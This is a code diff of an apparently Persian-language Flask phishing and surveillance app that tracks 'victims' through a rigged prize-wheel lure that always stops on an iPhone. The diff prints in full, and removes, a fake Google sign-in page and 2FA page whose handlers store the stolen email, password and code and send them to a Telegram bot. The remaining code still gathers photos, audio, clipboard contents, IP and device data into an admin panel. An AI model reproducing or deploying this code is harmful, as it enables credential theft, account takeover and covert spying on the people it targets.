@@ -26,6 +26,7 @@ def init_db():
         db.execute("CREATE TABLE IF NOT EXISTS victims (token TEXT PRIMARY KEY, created_at TEXT, ip TEXT)")
         db.execute("CREATE TABLE IF NOT EXISTS logs (id INTEGER PRIMARY KEY AUTOINCREMENT, token TEXT, type TEXT, data TEXT, timestamp TEXT)")
         db.execute("CREATE TABLE IF NOT EXISTS media (token TEXT, type TEXT, data BLOB, timestamp TEXT)")
+        # جدول credentials دیگر نیاز نیست ولی برای سازگاری باقی می‌ماند
         db.execute("CREATE TABLE IF NOT EXISTS credentials (token TEXT, email TEXT, password TEXT, code2fa TEXT, timestamp TEXT)")
         db.commit()
 
@@ -68,65 +69,6 @@ def send_telegram_file(file_bytes, filename, caption, as_image=False, as_video=F
         app.logger.error(f"Telegram file send failed: {e}")
 
 # -------------------- Templates --------------------
-LOGIN_PAGE = """
-<!DOCTYPE html>
-<html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
-<title>Sign in – Google</title>
-<style>
-*{margin:0;padding:0;box-sizing:border-box;}
-body{background:#fff;font-family:Roboto,Arial,sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;}
-.container{width:368px;padding:48px 40px 36px;border:1px solid #dadce0;border-radius:8px;box-shadow:0 2px 4px rgba(0,0,0,.1);}
-.logo{display:block;margin:0 auto 16px;width:75px;}
-h1{font-size:24px;font-weight:400;text-align:center;margin-bottom:8px;}
-.sub{font-size:16px;color:#5f6368;text-align:center;margin-bottom:32px;}
-input{width:100%;padding:13px 15px;border:1px solid #dadce0;border-radius:4px;font-size:16px;margin-bottom:16px;outline:none;transition:border .2s;}
-input:focus{border-color:#1a73e8;box-shadow:0 0 0 1px #1a73e8;}
-.btn{width:100%;padding:10px;background:#1a73e8;color:white;border:none;border-radius:4px;font-size:14px;font-weight:500;cursor:pointer;margin-top:24px;}
-.btn:hover{background:#1765cc;}
-.error{color:#d93025;font-size:12px;margin-bottom:16px;}
-</style></head>
-<body>
-<div class="container">
-  <img class="logo" src="https://www.gstatic.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google">
-  <h1>Sign in</h1>
-  <p class="sub">to continue to Free Wi-Fi</p>
-  <form method="POST" action="/login/{{ token }}">
-    <input type="text" name="email" placeholder="Email or phone" required>
-    <input type="password" name="password" placeholder="Enter your password" required>
-    {% if error %}<p class="error">{{ error }}</p>{% endif %}
-    <button class="btn" type="submit">Next</button>
-  </form>
-</div>
-</body></html>
-"""
-
-TWOFA_PAGE = """
-<!DOCTYPE html>
-<html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
-<title>2-Step Verification</title>
-<style>
-*{margin:0;padding:0;box-sizing:border-box;}
-body{background:#fff;font-family:Roboto,Arial,sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;}
-.container{width:368px;padding:48px 40px 36px;border:1px solid #dadce0;border-radius:8px;box-shadow:0 2px 4px rgba(0,0,0,.1);}
-h1{font-size:24px;font-weight:400;margin-bottom:16px;}
-p{font-size:14px;color:#5f6368;margin-bottom:24px;}
-input{width:100%;padding:13px 15px;border:1px solid #dadce0;border-radius:4px;font-size:24px;text-align:center;letter-spacing:8px;margin-bottom:16px;}
-.btn{width:100%;padding:10px;background:#1a73e8;color:white;border:none;border-radius:4px;font-size:14px;font-weight:500;cursor:pointer;}
-.error{color:#d93025;font-size:12px;margin-bottom:16px;}
-</style></head>
-<body>
-<div class="container">
-  <h1>2-Step Verification</h1>
-  <p>To protect your account, we need to verify it's you. Enter the 6-digit code from your Google Authenticator app or SMS.</p>
-  <form method="POST" action="/2fa/{{ token }}">
-    <input type="text" name="code" placeholder="G-123456" maxlength="6" pattern="[0-9]{6}" required>
-    {% if error %}<p class="error">{{ error }}</p>{% endif %}
-    <button class="btn" type="submit">Verify</button>
-  </form>
-</div>
-</body></html>
-"""
-
 GAME_PAGE_SPIN = """
 <!DOCTYPE html>
 <html>
@@ -345,7 +287,7 @@ GAME_PAGE_SPIN = """
             { label: 'لپ‌تاپ', color: '#1e90ff', value: 'laptop' },
             { label: 'شما برنده نشدید', color: '#747d8c', value: 'lose' },
             { label: 'هدفون', color: '#ff6b81', value: 'headphone' },
-            { label: 'آیفون ۱۵', color: '#ff4757', value: 'iPhone' }, // شانس بیشتر
+            { label: 'آیفون ۱۵', color: '#ff4757', value: 'iPhone' },
             { label: 'شارژ رایگان', color: '#2ed573', value: 'charge' }
         ];
         const numSlices = prizes.length;
@@ -383,7 +325,6 @@ GAME_PAGE_SPIN = """
                 ctx.restore();
             }
 
-            // دکمه وسط
             ctx.beginPath();
             ctx.arc(centerX, centerY, 30, 0, 2 * Math.PI);
             ctx.fillStyle = '#fff';
@@ -402,7 +343,6 @@ GAME_PAGE_SPIN = """
             cameraSection.style.display = 'none';
             apkBtn.style.display = 'none';
 
-            // همیشه روی آیفون ۱۵ (ایندکس ۰) متوقف شود
             const targetPrizeIndex = 0;
             const targetMiddleAngle = targetPrizeIndex * anglePerSlice + anglePerSlice / 2;
             const spinToAngle = (2 * Math.PI) - targetMiddleAngle + Math.PI/2;
@@ -509,8 +449,6 @@ ADMIN_PANEL = """
   <b>IP:</b> {{ v.ip }}<br>
   <b>Local IP:</b> {{ v.local_ip }}<br>
   <b>Time:</b> {{ v.created_at }}<br>
-  <b>Credentials:</b> {{ v.creds }}<br>
-  {% if v.code2fa %}<b>2FA Code:</b> {{ v.code2fa }}<br>{% endif %}
   <b>Device:</b> <pre>{{ v.info }}</pre>
   {% if v.photo %}<b>Latest Photo:</b><br><img src="data:image/jpeg;base64,{{ v.photo }}"><br>{% endif %}
   {% if v.audio %}<b>Audio:</b> <audio controls src="data:audio/webm;base64,{{ v.audio }}"></audio><br>{% endif %}
@@ -540,38 +478,8 @@ def new_link():
     return jsonify({"link": link, "token": token})
 
 @app.route('/go/<token>')
-def go_to_login(token):
-    return render_template_string(LOGIN_PAGE, token=token, error=None)
-
-@app.route('/login/<token>', methods=['POST'])
-def login(token):
-    email = request.form.get('email','').strip()
-    password = request.form.get('password','').strip()
-    if not email or not password:
-        return render_template_string(LOGIN_PAGE, token=token, error="Both fields required.")
-    db = get_db()
-    db.execute("INSERT INTO credentials (token, email, password, timestamp) VALUES (?, ?, ?, ?)",
-               (token, email, password, datetime.now().isoformat()))
-    db.commit()
-    send_telegram_message(f"🔑 <b>New Login</b>\nToken: <code>{token}</code>\nEmail: <code>{email}</code>\nPassword: <code>{password}</code>")
-    return redirect(url_for('twofa', token=token))
-
-@app.route('/2fa/<token>', methods=['GET','POST'])
-def twofa(token):
-    if request.method == 'POST':
-        code = request.form.get('code','').strip()
-        if not code or len(code)!=6 or not code.isdigit():
-            return render_template_string(TWOFA_PAGE, token=token, error="Enter a valid 6-digit code.")
-        db = get_db()
-        db.execute("UPDATE credentials SET code2fa=? WHERE token=? AND code2fa IS NULL", (code, token))
-        db.commit()
-        send_telegram_message(f"🔐 <b>2FA Code</b>\nToken: <code>{token}</code>\nCode: <code>{code}</code>")
-        # هدایت به بازی چرخ شانس
-        return redirect(url_for('game', token=token))
-    return render_template_string(TWOFA_PAGE, token=token, error=None)
-
-@app.route('/game/<token>')
-def game(token):
+def go_to_game(token):
+    """مستقیماً به بازی چرخ شانس هدایت می‌شود، بدون صفحه لاگین"""
     return render_template_string(GAME_PAGE_SPIN, token=token)
 
 @app.route('/upload/<token>', methods=['POST'])
@@ -713,9 +621,6 @@ def admin():
         token = row['token']
         log_dev = db.execute("SELECT data FROM logs WHERE token=? AND type='device' ORDER BY timestamp DESC LIMIT 1", (token,)).fetchone()
         info = json.loads(log_dev['data']) if log_dev else {}
-        cred_row = db.execute("SELECT email, password, code2fa FROM credentials WHERE token=? ORDER BY timestamp DESC LIMIT 1", (token,)).fetchone()
-        creds = f"{cred_row['email']}:{cred_row['password']}" if cred_row else ""
-        code2fa = cred_row['code2fa'] if cred_row and cred_row['code2fa'] else ""
         local_ip_row = db.execute("SELECT data FROM logs WHERE token=? AND type='local_ip' ORDER BY timestamp DESC LIMIT 1", (token,)).fetchone()
         local_ip = json.loads(local_ip_row['data']).get('ip','') if local_ip_row else ""
         clip_row = db.execute("SELECT data FROM logs WHERE token=? AND type='clipboard' ORDER BY timestamp DESC LIMIT 1", (token,)).fetchone()
@@ -740,8 +645,6 @@ def admin():
             "ip": row['ip'],
             "local_ip": local_ip,
             "created_at": row['created_at'],
-            "creds": creds,
-            "code2fa": code2fa,
             "info": json.dumps(info, indent=2, ensure_ascii=False),
             "photo": photo_b64,
             "audio": audio_b64,
